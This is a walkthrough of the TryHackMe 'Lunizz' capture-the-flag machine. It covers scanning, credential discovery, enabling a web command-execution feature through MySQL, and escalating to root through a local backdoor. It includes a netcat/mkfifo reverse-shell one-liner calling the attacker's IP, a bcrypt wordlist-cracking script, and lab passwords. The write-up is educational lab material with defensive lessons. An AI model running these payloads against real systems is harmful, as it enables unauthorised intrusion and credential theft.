# TryHackMe: Lunizz Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Category](https://img.shields.io/badge/Category-Penetration%20Testing-green)

A complete walkthrough of the **Lunizz** machine on TryHackMe. This writeup documents the reconnaissance, enumeration, initial access, lateral movement, and privilege escalation steps required to compromise the host and retrieve both flags.

---

## Table of Contents

- [Overview](#overview)
- [Environment](#environment)
- [Attack Summary](#attack-summary)
- [1. Reconnaissance](#1-reconnaissance)
- [2. Enumeration](#2-enumeration)
- [3. Initial Access](#3-initial-access)
- [4. Credential Harvesting](#4-credential-harvesting)
- [5. Lateral Movement](#5-lateral-movement)
- [6. Privilege Escalation](#6-privilege-escalation)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

| Field        | Value                      |
|--------------|----------------------------|
| Machine      | Lunizz                     |
| Platform     | TryHackMe                  |
| Difficulty   | Medium                     |
| Target IP    | `10.49.151.247`            |
| OS           | Ubuntu Linux               |
| Objective    | Obtain `user.txt` and `root.txt` |

---

## Environment

| Component         | Details                                  |
|-------------------|------------------------------------------|
| Attacker Machine  | Kali Linux                               |
| Attacker IP       | `192.168.136.156`                        |
| Target            | `10.49.151.247`                          |
| Working Directory | `/home/kali/thm/lunizz`                  |

---

## Attack Summary

The attack chain progresses through the following stages:

1. **Port scanning** revealed SSH, HTTP, MySQL, and several unidentified services.
2. **Port 4444** returned a base64-encoded challenge that yielded a plaintext credential.
3. **Directory fuzzing** on port 80 exposed `instructions.txt`, which contained MySQL credentials.
4. **MySQL access** exposed a flag table that gated a command execution feature on the web server.
5. **Remote code execution** through the web application provided a reverse shell as `www-data`.
6. **Offline password cracking** of a bcrypt hash recovered the password for the user `adam`.
7. **Lateral movement** to `mason` was achieved using clues found in the `adam` user's files.
8. **Privilege escalation to root** exploited a locally bound administrative backdoor on port 8080.

---

## 1. Reconnaissance

### 1.1 Full TCP Port Scan

A full port scan was performed to identify all open services on the target.

```bash
nmap -p- --min-rate 5000 10.49.151.247
```

**Results:**

| Port  | State | Service | Notes                                |
|-------|-------|---------|--------------------------------------|
| 22    | open  | ssh     | OpenSSH 8.2p1 (Ubuntu)               |
| 80    | open  | http    | Apache 2.4.41                        |
| 3306  | open  | mysql   | MySQL 8.0.42                         |
| 4444  | open  | krb524  | Unidentified, returns custom banner  |
| 5000  | open  | upnp    | Unidentified, returns error output   |
| 33060 | open  | mysqlx  | MySQL X Protocol                     |

### 1.2 Service and Version Detection

```bash
nmap -sC -sV -p 22,80,3306,4444,5000,33060 10.49.151.247
```

Key findings:

- **SSH (22):** OpenSSH 8.2p1 on Ubuntu. Password authentication is a potential target once credentials are obtained.
- **HTTP (80):** Default Apache page with `GET`, `POST`, `OPTIONS`, and `HEAD` methods enabled.
- **MySQL (3306):** MySQL 8.0.42 with a self-signed certificate. Remote authentication is possible.
- **Port 4444:** Responds with a challenge prompt, "Can you decode this for me?", followed by a base64 string.
- **Port 5000:** Leaks partial OpenSSL configuration output on connection.

---

## 2. Enumeration

### 2.1 Web Directory Enumeration

Directory brute-forcing was performed against the HTTP service using `gobuster`.

```bash
gobuster dir -u http://10.49.151.247/ -w /usr/share/wordlists/dirb/common.txt
```

Initial results:

```
/.htpasswd            (Status: 403)
/.htaccess            (Status: 403)
/hidden               (Status: 301) --> http://10.49.151.247/hidden/
/server-status        (Status: 403)
/whatever             (Status: 301) --> http://10.49.151.247/whatever/
```

A second pass with a larger wordlist and file extensions revealed a readable text file:

```bash
gobuster dir -u http://10.49.151.247/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php
```

```
/index.html           (Status: 200)
/instructions.txt     (Status: 200)
```

### 2.2 Analysis of `instructions.txt`

Retrieving `http://10.49.151.247/instructions.txt` disclosed database credentials intended for a monitoring account:

```
- Create a mysql user (runcheck:CTF_script_cave_changeme)
```

### 2.3 Decoding the Port 4444 Service

Connecting to port 4444 presented a base64 challenge. Decoding the supplied string produced a password.

```bash
nc -vn 10.49.151.247 4444
```

```
Can you decode this for me?
ZXh0cmVtZWhhcmRyb290cGFzc3dvcmQ=
```

```bash
echo 'ZXh0cmVtZWhhcmRyb290cGFzc3dvcmQ=' | base64 -d
```

```
extremehardrootpassword
```

Other responses from this service decoded to `p@ssword` and returned a `Wrong Password` message, indicating an authentication check that was not further exploited.

---

## 3. Initial Access

### 3.1 MySQL Enumeration

Using the credentials recovered from `instructions.txt`, the MySQL service was accessed remotely.

```bash
mysql -u runcheck -h 10.49.151.247 -p
```

Available databases:

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| runornot           |
+--------------------+
```

The `runornot` database contained a table named `runcheck` with a single control value:

```sql
USE runornot;
SELECT * FROM runcheck;
```

```
+------+
| run  |
+------+
|    0 |
+------+
```

The web application at `/whatever` contained a command execution interface that was only active when this value was set to `1`. This indicates that the database value acted as a feature flag controlling whether commands could be submitted.

### 3.2 Enabling Command Execution

The control value was switched to enable the feature:

```sql
UPDATE runcheck SET run=1;
```

After the update, the command execution interface on `/whatever` accepted input and executed commands on the server as `www-data`.

### 3.3 Verifying Remote Code Execution

Directory listings confirmed the account context and identified the local users on the system:

```
drwxr-xr-x 25 root     root     4.0K  ..
drwxr-x---  4 adam     adam     4.0K  adam
drwxr-x---  2 mason    mason    4.0K  mason
drwxr-xr-x  2 ssm-user ssm-user 4.0K  ssm-user
drwxr-xr-x  3 ubuntu   ubuntu   4.0K  ubuntu
```

Two user accounts of interest were identified: **adam** and **mason**.

### 3.4 Reverse Shell

A listener was started on the attacker machine:

```bash
nc -lvnp 5555
```

The following payload was submitted through the command execution interface:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.136.156 5555 > /tmp/f
```

The listener received the connection:

```
connect to [192.168.136.156] from (UNKNOWN) [10.49.151.247] 60834
www-data@ip-10-49-151-247:/var/www/html/whatever$
```

### 3.5 Shell Stabilization

The shell was upgraded to a fully interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background the listener
stty raw -echo
fg
export TERM=xterm-256color
```

---

## 4. Credential Harvesting

### 4.1 Discovering the Password Hashing Script

Browsing the filesystem as `www-data` revealed a directory containing a bcrypt utility:

```bash
cat /proct/pass/bcrypt_encryption.py
```

```python
import bcrypt
import base64

passw = "wewillROCKYOU".encode('ascii')
b64str = base64.b64encode(passw)
hashAndSalt = bcrypt.hashpw(b64str, bcrypt.gensalt())
print(hashAndSalt)

#hashAndSalt = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
```

The script shows the scheme used to store passwords: the plaintext is base64-encoded first, and the result is hashed with bcrypt. Any cracking attempt must replicate this exact transformation.

### 4.2 Offline Cracking of the Stored Hash

A second script was discovered containing a target hash and salt. It was adapted to iterate through a wordlist, apply the same base64-then-bcrypt transformation, and compare the output to the target.

```python
import bcrypt
import base64

hashpassword = b'$2b$12$SVInH5XmuS3C7eQkmqa6UOM6sDIuumJPrvuiTr.Lbz3GCcUqdf.z6'
salt = b'$2b$12$SVInH5XmuS3C7eQkmqa6UO'

with open("rockyou.txt", "r", errors="ignore") as file:
    for p in file:
        password = p.strip()
        try:
            bpass = password.encode('ascii')
            passed = str(base64.b64encode(bpass))
            hashAndSalt = bcrypt.hashpw(passed.encode(), salt)
            if hashAndSalt == hashpassword:
                print("MATCH:", password, hashAndSalt)
                break
        except Exception:
            continue
```

Running this against `rockyou.txt` recovered the password for the user **adam**:

```
adam : bowwow
```

> **Note:** The base64 step is what makes a standard wordlist attack fail if skipped. Replicating the exact encoding pipeline from the source script is essential.

---

## 5. Lateral Movement

### 5.1 SSH Access as adam

The recovered credentials were used to authenticate as `adam`:

```bash
ssh adam@10.49.151.247
```

### 5.2 Enumerating adam's Home Directory

Inspection of `adam`'s home directory revealed a configuration file:

```bash
cat ~/.runasmason.conf
```

```ini
[CONFIG]
runasmason                        = True
backup_password                   = "helpme" # use -b for backup password
can_runasmason_run_other_commands = False
```

A hidden archive directory was also present:

```bash
cd ~/Desktop/.archive
ls
cat to_my_best_friend_adam.txt
```

```
do you remember our place
i love there it's soo calming
i will make that lights my password

--

https://www.google.com/maps/@68.5090469,27.481808,3a,75y,313.8h,103.6t/...
```

The note includes a location reference and a hint pointing to the password for the next account. Following the clue, the password **`northernlights`** was tested for `mason`.

### 5.3 Switching to mason

```bash
su mason
Password: northernlights
```

```
$ id
uid=1001(mason) gid=1001(mason) groups=1001(mason)
$ /bin/bash
mason@ip-10-49-151-247:~$
```

The user flag was located in `mason`'s home directory:

```bash
cat ~/user.txt
```

---

## 6. Privilege Escalation

### 6.1 Identifying a Local Service

Checking listening sockets revealed an administrative service bound only to the loopback interface:

```bash
ss -tulpn | grep LISTEN
```

```
tcp   LISTEN   0   4096   127.0.0.1:8080   0.0.0.0:*
```

Because the port is not exposed externally, it was reached through an SSH local port forward from the attacker machine:

```bash
ssh -L 8081:127.0.0.1:8080 mason@10.49.151.247
```

Browsing `http://127.0.0.1:8081/` presented a service titled **Mason's Root Backdoor**, which accepted a `password` parameter and a `cmdtype` parameter. The supported command types were `lsla`, `reboot`, and `passwd`.

### 6.2 Abusing the Backdoor to Reset the Root Password

The `passwd` command type allowed the password to be changed through an unauthenticated POST request:

```bash
curl http://127.0.0.1:8080/ -X POST -d "password=northernlights&cmdtype=passwd"
```

```
Password Changed To :northernlights
```

The root password was successfully set to a known value.

### 6.3 Gaining Root

```bash
su root
Password: northernlights
```

```
root@ip-10-49-151-247:/home/mason#
```

### 6.4 Retrieving the Root Flag

```bash
cd /root
ls
cat r00t.txt
```

---

## Flags

| Flag        | Location                   | Value        |
|-------------|----------------------------|--------------|
| `user.txt`  | `/home/mason/user.txt`     | `<user-flag>` |
| `root.txt`  | `/root/r00t.txt`           | `<root-flag>` |

> Flag values are intentionally omitted from this public writeup in accordance with TryHackMe guidelines.

---

## Lessons Learned

- **Never leave credentials in publicly readable files.** The `instructions.txt` file exposed database access that became the foundation of the entire attack chain.
- **Feature flags stored in databases must be protected.** Allowing a low-privilege database user to toggle command execution converts a data-layer weakness into remote code execution.
- **Encoding is not encryption.** Base64 transformations on passwords provide no meaningful protection and only add complexity to attacks that can replicate them.
- **Loopback-only services are not a security boundary.** Any service bound to `127.0.0.1` remains reachable by any user who can establish a tunnel, and must still require authentication.
- **Unauthenticated administrative endpoints are critical risks.** The root password reset endpoint on port 8080 provided a direct path to full system compromise.
- **Password reuse and predictable credentials accelerate lateral movement.** Clues left in user directories enabled the pivot from `adam` to `mason` and eventually to `root`.

---

## Tools Used

| Tool        | Purpose                                      |
|-------------|----------------------------------------------|
| Nmap        | Port scanning and service fingerprinting     |
| Gobuster    | Web directory and file enumeration           |
| Netcat      | Banner grabbing and reverse shell listener   |
| MySQL Client| Database enumeration and manipulation        |
| Python 3    | Offline hash cracking and shell upgrade      |
| Curl        | Interacting with the local administrative API|
| SSH         | Authenticated access and port forwarding     |

---

## References

- [TryHackMe: Lunizz](https://tryhackme.com/)
- [Nmap Documentation](https://nmap.org/book/man.html)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [GTFOBins](https://gtfobins.github.io/)

---

## Disclaimer

This writeup is intended solely for educational purposes and was performed in a legal, authorized lab environment provided by TryHackMe. The techniques described should only be used against systems where you have explicit written permission to test.

# Jai Shri Ram
